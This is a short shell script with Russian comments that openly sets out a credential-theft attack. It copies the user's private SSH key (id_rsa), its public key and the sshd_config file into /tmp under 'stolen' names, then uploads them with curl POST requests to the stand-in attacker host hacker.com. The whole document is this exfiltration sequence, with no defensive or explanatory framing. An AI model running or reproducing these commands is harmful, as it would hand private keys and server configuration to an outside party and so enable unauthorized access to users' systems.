# 1. Копирование SSH-ключей
cp ~/.ssh/id_rsa /tmp/stolen_key
cp ~/.ssh/id_rsa.pub /tmp/stolen_key.pub

# 2. Копирование конфигов
cp /etc/ssh/sshd_config /tmp/stolen_sshd_config

# 3. Отправка данных на внешний сервер
curl -X POST --data-binary @/tmp/stolen_key http://hacker.com/steal
curl -X POST --data-binary @/tmp/stolen_sshd_config http://hacker.com/steal
